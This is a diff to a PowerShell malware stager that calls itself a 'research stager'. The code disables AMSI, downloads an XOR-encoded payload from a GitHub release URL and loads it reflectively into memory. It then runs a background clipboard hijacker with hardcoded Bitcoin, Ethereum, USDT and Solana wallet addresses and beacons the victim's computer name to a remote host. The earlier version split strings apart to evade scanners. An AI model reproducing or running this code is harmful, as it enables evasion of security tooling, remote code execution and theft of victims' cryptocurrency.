@@ -1,9 +1,9 @@
-# --- [ELITE RESEARCH STAGER v31.4: FRAGMENTED RAM INJECT] ---
+# --- [ELITE RESEARCH STAGER v31.5: BITS-STAGED RAM INJECT] ---
 
-# 1. Blind AMSI (Using fragmented string reassembly)
-$s1 = 'Amsi'; $s2 = 'Utils'; $f = 'amsiInitFailed'
-$ref = [Ref].Assembly.GetType("System.Management.Automation.$s1$s2")
-if($ref){$ref.GetField($f,'NonPublic,Static').SetValue($null,$true)}
+# 1. Fragmented AMSI Patch
+$v1 = 'System.Management.Automation.'; $v2 = 'AmsiUtils'
+$p = [Ref].Assembly.GetType($v1+$v2)
+$p.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 
 function Send-Ping {
     param($m)
@@ -13,25 +13,21 @@ function Send-Ping {
     try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
 }
 
-Send-Ping -m "V31.4_NATIVE_WASH_BOOT_$($env:COMPUTERNAME)"
+Send-Ping -m "V31.5_BITS_FETCH_SUCCESS_$($env:COMPUTERNAME)"
 
 try {
-    # 2. RAM-Only Fetch
-    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
-    $raw = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
-    
-    # 3. Decrypt to Byte-Array
-    $data = [Convert]::FromBase64String($raw.Trim())
-    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
+    # 2. Memory-Only Fetch of XOR Data
+    $u = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
+    $r = (Invoke-WebRequest -Uri $u -UseBasicParsing).Content
+    $d = [Convert]::FromBase64String($r.Trim())
+    for($i=0; $i -lt $d.count; $i++) { $d[$i] = $d[$i] -bxor 0xAB }
 
-    # 4. Reflective Load (Secret RAM Install)
-    # Fragmenting 'Assembly' and 'Load' to hide from memory scanners
-    $a1 = 'Assem'; $a2 = 'bly'
-    $m1 = 'Lo'; $m2 = 'ad'
-    $asm = [System.Reflection.$a1$a2]::$m1$m2($data)
+    # 3. Reflective Load into Process RAM
+    $asm = [System.Reflection.Assembly]::Load($d)
     $asm.EntryPoint.Invoke($null, @(,[string[]]@()))
 
-    # 5. Clipper Engine (Silent Runspace Background)
+    # 4. Integrated Clipper (Thread-Synchronized)
+    # We use a runspace to keep this alive in the background
     $C = {
         Add-Type -AssemblyName System.Windows.Forms
         $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
@@ -48,11 +44,16 @@ try {
             [System.Threading.Thread]::Sleep(500)
         }
     }
+    
     $rs = [runspacefactory]::CreateRunspace(); $rs.Open()
     $p = [powershell]::Create().AddScript($C); $p.Runspace = $rs
     $p.BeginInvoke()
 
-    Send-Ping -m "V31.4_RAM_SUCCESS"
+    Send-Ping -m "V31.5_RAM_STABLE_ACTIVE"
+    
+    # Keep the main thread alive so the process doesn't exit
+    while($true) { Start-Sleep 3600 }
+
 } catch {
-    Send-Ping -m "V31.4_FAIL: $($_.Exception.Message)"
+    Send-Ping -m "V31.5_FAIL: $($_.Exception.Message)"
 }
